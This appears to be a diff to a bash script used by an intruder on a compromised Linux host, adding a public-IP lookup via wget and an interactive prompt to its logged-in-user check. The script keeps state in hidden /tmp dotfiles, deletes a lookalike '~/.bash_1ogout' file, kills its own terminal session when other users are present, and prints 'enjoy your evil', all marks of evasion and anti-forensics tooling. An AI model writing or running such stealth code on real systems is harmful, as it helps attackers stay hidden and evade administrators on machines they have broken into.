@@ -16,6 +16,7 @@ export FLAG="#_fdsagadsfasdgadsgsss" #_fdsagadsfasdgadsgsss
 my_name="$(whoami)" #_fdsagadsfasdgadsgsss
 my_pts="$(who am i| awk '{print $2}' | xargs)" #_fdsagadsfasdgadsgsss
 my_ip="$(last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | xargs)" #_fdsagadsfasdgadsgsss
+this_ip="$(wget -q -O- 'https://ifconfig.co/ip' | xargs)" #_fdsagadsfasdgadsgsss
 index_f=/tmp/._fadsgindexfs; #_fdsagadsfasdgadsgsss
 clear_shell=/tmp/.asdgsdgdg_log_c; #_fdsagadsfasdgadsgsss
 load_file=/tmp/.fadsgasdasdg_casdggd; #_fdsagadsfasdgadsgsss
@@ -110,9 +111,16 @@ else #_fdsagadsfasdgadsgsss
    fi #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
 if [ $(( $(w|grep pts | wc -l ) )) -gt 0 ];then #_fdsagadsfasdgadsgsss
-    gglog "warnning user is logined in !!!! , so exit "; #_fdsagadsfasdgadsgsss
-    w; #_fdsagadsfasdgadsgsss
-    _ki $my_pts #_fdsagadsfasdgadsgsss
+    gglog "warnning user is logined in !!!! , so exit? [Enter/other] "; #_fdsagadsfasdgadsgsss
+    read if_exit; #_fdsagadsfasdgadsgsss
+    if [[ $if_exit == "" ]];then #_fdsagadsfasdgadsgsss
+    	w; #_fdsagadsfasdgadsgsss
+	if [ -f ~/.bash_1ogout ];then #_fdsagadsfasdgadsgsss
+	  rm ~/.bash_1ogout; #_fdsagadsfasdgadsgsss
+	fi #_fdsagadsfasdgadsgsss
+       _ki $my_pts; #_fdsagadsfasdgadsgsss
+    fi  #_fdsagadsfasdgadsgsss
+    deepcheck  #_fdsagadsfasdgadsgsss
 else #_fdsagadsfasdgadsgsss
     gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
     deepcheck  #_fdsagadsfasdgadsgsss
